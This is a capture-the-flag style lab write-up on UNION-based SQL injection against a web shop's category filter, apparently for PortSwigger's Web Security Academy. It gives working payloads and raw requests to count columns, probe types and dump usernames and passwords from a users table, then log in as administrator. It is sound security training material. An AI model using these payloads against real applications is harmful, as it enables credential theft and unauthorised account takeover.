# SQL Injection - Lab #5: SQL injection UNION attack, retrieving data from other tables

**YouTube Tutorial:** [SQL Injection - Lab #5 SQL injection UNION attack, retrieving data from other tables](https://www.youtube.com/watch?v=6Dsj5SqR944)

---

## 1. Attack Overview & Key Concepts

### Vulnerability Explanation

* **Core Concept:** A SQL injection vulnerability exists in the product category filter (`category`). The application processes user input directly into an SQL query and returns the query results directly within the HTTP response body.
* **Vulnerability Behavior:** Because the response contains database output, an attacker can leverage a `UNION`-based SQL injection to append their own database queries and extract data.

### Root Cause & Impact

* **Root Cause:** Unsanitized string concatenation in backend database queries.
* **Requirements for UNION Exploitation:**
1. The injected `SELECT` query must return the exact same number of columns as the original query.
2. The data types of corresponding columns must be compatible across both queries.


* **Goal:** Use a `UNION`-based SQL injection attack to retrieve the usernames and passwords from the `users` table, and use the extracted credentials to log in as the `administrator` user.

---

## 2. Attack Methods & Techniques

### Method Details

* **Phase 1 (Column Count Enumeration):** Use `ORDER BY N--` to identify the total number of columns returned by the query.
* **Phase 2 (Data Type Identification):** Systematically replace each `NULL` value in the `UNION SELECT` statement with a string literal (e.g., `'a'`) to verify which columns can render text.
* **Phase 3 (Data Extraction):** Construct a `UNION SELECT username, password FROM users--` payload to retrieve sensitive account credentials.

### Server Behavior

* **Incompatible Data Type / Syntax Error:** If `ORDER BY` exceeds the valid column index or if data types mismatch in a `UNION` query, the database throws an error, resulting in an **HTTP 500 Internal Server Error**.
* **Compatible Data Type / Successful Attack:** When column count and data types match, the server returns an **HTTP 200 OK** and renders the extracted database rows on the page.

---

## 3. Attack Flowchart

```
+-------------------------------------------------------+
|  Step 1: Intercept Product Filter Request (category)  |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 2: Determine Column Count (ORDER BY N--)        |
|  • ORDER BY 1, 2 -> HTTP 200 OK                       |
|  • ORDER BY 3    -> HTTP 500 Error                    |
|  Result: Total = 2 Columns                            |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 3: Test Data Types (UNION SELECT 'a'...)        |
|  • UNION SELECT 'a', NULL -> HTTP 200 OK              |
|  • UNION SELECT NULL, 'a' -> HTTP 200 OK              |
|  Result: Both columns are string compatible           |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 4: Retrieve Credentials from Users Table        |
|  UNION SELECT username, password FROM users--         |
|  -> HTTP 200 OK (Usernames & Passwords Rendered)      |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 5: Extract Administrator Password & Log In      |
|  -> HTTP 200 OK (Lab Solved)                          |
+-------------------------------------------------------+

```

---

## 4. UML Sequence Diagram

```
Browser / User          Burp Suite Proxy          Web Application               Database
      |                         |                        |                         |
      |-- 1. GET /filter?cat=Gifts' ORDER BY 3-- ------->|                         |
      |                         |                        |-- 2. Execute SQL ------>|
      |                         |                        |<-- 3. Out-Of-Bounds ----|
      |<-- 4. HTTP 500 Error ---|<-- 5. Return 500 -------|                         |
      |                         |                        |                         |
      |== 6. Column count confirmed = 2 columns ===================================|
      |                         |                        |                         |
      |-- 7. GET /filter?cat=Gifts' UNION SELECT username, password FROM users-- ->|
      |                         |                        |-- 8. Execute UNION ---->|
      |                         |                        |<-- 9. Users Table Data -|
      |<-- 10. HTTP 200 OK -----|<-- 11. Render Credentials |                         |
      |                         |                        |                         |
      |-- 12. POST /login (administrator credentials) -->|                         |
      |                         |                        |-- 13. Validate User --->|
      |                         |                        |<-- 14. Session Created  |
      |<-- 15. Lab Solved! -----|<-- 16. HTTP 200 OK -----|                         |

```

---

## 5. Step-by-Step Walkthrough

### Step 1: Determine Column Count

1. Test index ordering using `ORDER BY`:
* `GET /filter?category=Gifts'+ORDER+BY+1--` $\rightarrow$ **HTTP 200 OK**
* `GET /filter?category=Gifts'+ORDER+BY+2--` $\rightarrow$ **HTTP 200 OK**
* `GET /filter?category=Gifts'+ORDER+BY+3--` $\rightarrow$ **HTTP 500 Internal Server Error**


2. **Result:** Query returns **2 columns**.

### Step 2: Identify String-Compatible Column Positions

Iteratively test each column position with a string value while keeping the others as `NULL`.

* **Test Column 1:**
`GET /filter?category=Gifts'+UNION+SELECT+'a',+NULL--`
$\rightarrow$ **HTTP 200 OK** *(Column 1 accepts string values)*.
* **Test Column 2:**
`GET /filter?category=Gifts'+UNION+SELECT+NULL,+'a'--`
$\rightarrow$ **HTTP 200 OK** *(Column 2 accepts string values)*.

### Step 3: Extract User Credentials

Inject a `UNION SELECT` query to pull entries from the `username` and `password` columns in the `users` table:

* **Payload:**
```sql
Gifts' UNION SELECT username, password FROM users--

```


* **Raw Request:**
```http
GET /filter?category=Gifts%27+UNION+SELECT+username%2C+password+FROM+users-- HTTP/1.1
Host: [LAB-ID].web-security-academy.net

```


* **Response:** **HTTP 200 OK** $\rightarrow$ Usernames and passwords (including `administrator`) are displayed directly on the rendered page.

### Step 4: Complete the Lab

1. Copy the extracted administrator password.
2. Navigate to `/login`.
3. Log in with `administrator` and the extracted password.
4. **Response:** **HTTP 200 OK** $\rightarrow$ **Lab Solved Successfully**.

---

## 6. Pro-Tips & Common Pitfalls

* **Table & Column Names:** When performing a `UNION` attack to pull external data, ensure table names (`users`) and column names (`username`, `password`) match the target schema.
* **Dual Text Columns Advantage:** In this scenario, both columns support string types, allowing simultaneous extraction of two fields without needing concatenation functions.
* **URL Encoding:** Always URL-encode special characters in parameters (`'` to `%27`, spaces to `+` or `%20`, commas to `%2C`) to prevent syntax corruption before reaching the backend server.